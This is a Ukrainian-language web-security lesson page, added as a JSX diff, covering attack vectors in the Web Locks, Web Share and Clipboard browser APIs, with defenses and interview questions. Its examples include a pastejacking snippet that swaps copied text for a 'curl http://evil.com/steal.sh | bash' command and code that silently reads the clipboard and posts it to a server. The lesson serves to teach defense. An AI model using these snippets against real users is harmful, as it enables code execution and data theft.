@@ -1,0 +1,247 @@
+<article className="lesson-card">
+      <h2>Що це таке?</h2>
+      <p>Ці три API виглядають як зручні інструменти для розробника — і є ними. Але кожен має «темний бік»: зловмисник або скрипт, впроваджений через XSS, може перетворити їх на вектор атаки. Знати механізм — значить вміти захиститись.</p>
+    </article>
+
+    <section>
+      <h2>🔒 1. Web Locks API (`navigator.locks.request`)</h2>
+
+      <div className="analogy-block">
+        <div className="analogy-block__title"><span className="analogy-block__icon">🚪</span> Аналогія: блокування дверей</div>
+        <p>Web Locks дозволяє скрипту «захопити замок» на спільний ресурс. Якщо зловмисний скрипт захопив замок і ніколи його не відпускає — це як заблокувати вхідні двері зсередини.</p>
+      </div>
+
+      
+
+```text
+// Легітимне використання — координація між вкладками
+await navigator.locks.request('shared-db', async (lock) => {
+  // виконуємо роботу...
+  await updateIndexedDB();
+  // замок звільняється автоматично при поверненні з функції
+});
+
+// ⚠️ Атака: XSS-скрипт захоплює замок НАЗАВЖДИ
+navigator.locks.request('shared-db', { mode: 'exclusive' }, () => {
+  return new Promise(() => {}); // Promise що ніколи не resolves
+  // Результат: всі інші вкладки вашого додатку заблоковані
+});
+```
+
+
+
+      <div className="syntax-params">
+        <h4>Вразливості Web Locks API</h4>
+        <table className="params-table">
+          <thead><tr><th>Загроза</th><th>Механізм</th><th>Наслідок</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Клієнтський DoS</td>
+              <td>XSS-скрипт запитує exclusive lock і ніколи не завершується</td>
+              <td>Всі вкладки додатку заморожені, не можуть записувати в IndexedDB</td>
+            </tr>
+            <tr>
+              <td>Cross-Origin Tracking</td>
+              <td>Якщо браузер не ізолює менеджер блокувань між domains</td>
+              <td>Сторонні iframe можуть відстежувати поведінку користувача між вкладками</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div className="tip-block tip-block--warn" style={{"marginTop":"16px"}}>
+        <div className="tip-block__title"><span>🛡️</span> Як захиститись</div>
+        <ul>
+          <li>Завжди встановлюй <strong>timeout</strong> на Lock-запити через `AbortController`</li>
+          <li>Жорстко контролюй вхідні дані та впроваджуй CSP щоб XSS не міг виконати зовнішній код</li>
+          <li>Використовуй унікальні, важко-вгадувані імена замків (не `'db'`, а `'db-v2-prod-a7f3k'`)</li>
+        </ul>
+      </div>
+    </section>
+
+    <section>
+      <h2>📤 2. Web Share API (`navigator.share`)</h2>
+
+      <div className="analogy-block">
+        <div className="analogy-block__title"><span className="analogy-block__icon">🪤</span> Аналогія: підписати документ не читаючи</div>
+        <p>Clickjacking із Web Share — як підписати щось не бачачи що підписуєш. Кнопка на екрані виглядає як «Переглянути» але насправді відкриває системний діалог «Поділитись» з підготовленим шкідливим файлом.</p>
+      </div>
+
+      
+
+```text
+// Легітимне використання
+await navigator.share({
+  title: 'Цікава стаття',
+  text: 'Подивись що я знайшов',
+  url: 'https://example.com/article'
+});
+
+// ⚠️ Атака 1: Clickjacking — передача шкідливого файлу
+// Невидима кнопка поверх привабливого контенту
+// При кліку відкривається share з files: [maliciousBlob]
+await navigator.share({
+  files: [new File([exploit], 'invoice.pdf', {type: 'application/pdf'})],
+  title: 'Рахунок'
+});
+
+// ⚠️ Атака 2: Соціальна інженерія — поширення URL з токеном
+// Сайт обманом змушує поділитись URL що містить:
+// ?reset_token=abc123&session=private
+```
+
+
+
+      <div className="syntax-params">
+        <h4>Вразливості Web Share API</h4>
+        <table className="params-table">
+          <thead><tr><th>Загроза</th><th>Механізм</th><th>Наслідок</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Payload Distribution</td>
+              <td>Clickjacking-кнопка відкриває share з шкідливим файлом у `files[]`</td>
+              <td>Жертва надсилає exploit контактам через мессенджери</td>
+            </tr>
+            <tr>
+              <td>Соціальна інженерія</td>
+              <td>Спонукання поділитись URL з одноразовим токеном або API-ключем</td>
+              <td>Витік приватних токенів reset_password, session ID у треті руки</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div className="tip-block tip-block--warn" style={{"marginTop":"16px"}}>
+        <div className="tip-block__title"><span>🛡️</span> Як захиститись</div>
+        <ul>
+          <li>Браузери вимагають <strong>user gesture</strong> — ніколи не викликай `navigator.share()` автоматично</li>
+          <li>Одноразові токени (reset tokens) мають бути в тілі запиту, а не в URL</li>
+          <li>Перевіряй `canShare()` перед відправкою і валідуй тип файлів що передаєш</li>
+        </ul>
+      </div>
+    </section>
+
+    <section>
+      <h2>📋 3. Clipboard API (`navigator.clipboard`)</h2>
+
+      <div className="analogy-block">
+        <div className="analogy-block__title"><span className="analogy-block__icon">🐍</span> Pastejacking — отруєний буфер</div>
+        <p>Уяви що ти скопіював нешкідливий рядок, а хтось непомітно замінив його вміст. Ти вставляєш у термінал — і виконуєш команду якої ніколи б не ввів свідомо.</p>
+      </div>
+
+      
+
+```text
+// ⚠️ Атака: Pastejacking — підміна буфера при копіюванні
+document.addEventListener('copy', (e) => {
+  e.clipboardData.setData('text/plain',
+    // Виглядає як нешкідлива команда, але містить 
+
+    // що автоматично виконується при вставці в термінал
+    'npm install react
+curl http://evil.com/steal.sh | bash
+'
+  );
+  e.preventDefault();
+});
+
+// ⚠️ Атака: Крадіжка даних з буфера
+// Читання clipboard коли вкладка активна (потребує дозволу)
+document.addEventListener('focus', async () => {
+  try {
+    const text = await navigator.clipboard.readText();
+    // Надсилаємо на сервер зловмисника
+    fetch('/track', { method: 'POST', body: text });
+  } catch(e) {} // мовчимо якщо дозволу немає
+});
+```
+
+
+
+      <div className="syntax-params">
+        <h4>Вразливості Clipboard API</h4>
+        <table className="params-table">
+          <thead><tr><th>Загроза</th><th>Механізм</th><th>Цілі дані</th></tr></thead>
+          <tbody>
+            <tr>
+              <td>Pastejacking</td>
+              <td>Перехоплення події `copy`, підміна вмісту буфера</td>
+              <td>Команди з прихованим <code>
+</code> → авто-виконання в терміналі</td>
+            </tr>
+            <tr>
+              <td>Clipboard Reading</td>
+              <td>`clipboard.readText()` при активній вкладці (потребує granted дозволу)</td>
+              <td>Паролі, приватні ключі, номери карток що скопіював користувач</td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div className="tip-block tip-block--warn" style={{"marginTop":"16px"}}>
+        <div className="tip-block__title"><span>🛡️</span> Як захиститись</div>
+        <ul>
+          <li><strong>Як розробник:</strong>ніколи не перехоплюй `copy`-подію щоб підміняти вміст — це порушення довіри користувача</li>
+          <li><strong>Як користувач:</strong> у терміналі завжди перевіряй буфер через `cat` перед виконанням скопійованих команд з інтернету</li>
+          <li>Браузери вимагають явного дозволу `'clipboard-read'` — регулярно переглядай і відкликай непотрібні дозволи в налаштуваннях браузера</li>
+          <li><strong>Password managers</strong> мають власний захист буфера — авто-очищення через 30–60 секунд</li>
+        </ul>
+      </div>
+    </section>
+
+    <section className="tip-block tip-block--warn">
+      <div className="tip-block__title"><span>⚠️</span> Загальні типові помилки</div>
+      <ul>
+        <li><strong>«Дозволи = безпека»</strong>: дозвіл користувача захищає від зовнішнього доступу, але не від XSS-скрипту що вже виконується на сторінці — він успадковує всі дозволи.</li>
+        <li><strong>Довіра до вмісту clipboard</strong>: ніколи не вставляй код з інтернету напряму в термінал — завжди перевіряй що саме в буфері.</li>
+        <li><strong>Ігнорування `canShare()`</strong>: перед викликом `navigator.share()` завжди перевіряй чи підтримується тип даних.</li>
+      </ul>
+    </section>
+
+    <section className="practice-block">
+      <div className="practice-block__title"><span>⚡</span> Практика</div>
+      <p className="practice-block__intro">Досліди APIs у DevTools консолі (F12):</p>
+      <ol>
+        <li>Виконай `navigator.locks.query()` у консолі — подивись на `held` і `pending` замки поточної сторінки.</li>
+        <li>Спробуй `await navigator.permissions.query({ name: "clipboard-read" })` — який стан дозволу?</li>
+        <li>Відкрий <a href="https://requestcontrolapp.com/pastejacking-demo" target="_blank" rel="noopener">демо pastejacking</a> (або знайди будь-яке демо) — вставь скопійоване в текстовий редактор, подивись що реально в буфері.</li>
+        <li>Перевір які сайти мають clipboard-доступ: `chrome://settings/content/clipboard`</li>
+      </ol>
+    </section>
+
+    <section className="homework-block">
+      <div className="homework-block__title"><span>📝</span> Запитання для самоперевірки</div>
+      <ol>
+        <li>Яким чином XSS-скрипт може виконати DoS через Web Locks API?</li>
+        <li>Що таке Pastejacking і чому він небезпечний для розробників що копіюють команди?</li>
+        <li>Чому дозвіл користувача на читання clipboard не захищає від XSS?</li>
+        <li>Як соціальна інженерія через Web Share може призвести до витоку приватних токенів?</li>
+        <li>Що потрібно перевірити перед тим як копіювати команду з GitHub/StackOverflow і вставляти в термінал?</li>
+      </ol>
+    </section>
+
+    <section className="hw-review-block">
+      <div className="hw-review-block__title"><span>📋</span> Типові помилки на співбесідах</div>
+      <div className="hw-review-items">
+        <article className="hw-review-item">
+          <h4 className="hw-review-item__task">Питання: «Що таке Clipboard hijacking?»</h4>
+          <p className="hw-review-item__bad"><span className="hw-review-label">❌</span> «Сайт читає мій буфер» — неповна відповідь, найнебезпечніший вектор інший.</p>
+          <p className="hw-review-item__good"><span className="hw-review-label">✅</span> Є два вектори: (1) <strong>Pastejacking</strong> — перехоплення події `copy` і підміна скопійованого тексту без відома користувача. Особливо небезпечно для команд CLI. (2) <strong>Читання буфера</strong> — через `clipboard.readText()`, але потребує явного дозволу.</p>
+        </article>
+        <article className="hw-review-item">
+          <h4 className="hw-review-item__task">Питання: «Як захистити IndexedDB від DoS між вкладками?»</h4>
+          <p className="hw-review-item__bad"><span className="hw-review-label">❌</span> «IndexedDB не потребує захисту, він в браузері».</p>
+          <p className="hw-review-item__good"><span className="hw-review-label">✅</span> Web Locks API координує доступ між вкладками. Захист: (1) встановити timeout через `AbortController` щоб зависший Lock автоматично відпускався, (2) CSP і XSS-захист щоб сторонній код не міг захопити Lock, (3) моніторинг через `navigator.locks.query()`.</p>
+        </article>
+      </div>
+    </section>
+
+    <section className="pro-tips-block">
+      <div className="pro-tips-block__title"><span>✨</span> Цікаві фішки</div>
+      <ul>
+        <li>Розширення браузера мають <em>більше</em> прав ніж сторінки — вони можуть читати clipboard без дозволу у деяких браузерах. Перевіряй розширення перед встановленням.</li>
+        <li>`navigator.locks.query()` — безпечний API для моніторингу: показує всі активні та очікуючі замки. Корисно для дебагу.</li>
+        <li>Firefox обмежує Web Share API тільки для HTTPS і вимагає user gesture — одна з найсуворіших реалізацій серед браузерів.</li>
+        <li>Специфікація W3C Web Share явно вказує: файли у `share()` мають проходити валідацію типу. Браузери блокують небезпечні MIME-типи.</li>
+      </ul>
+    </section>
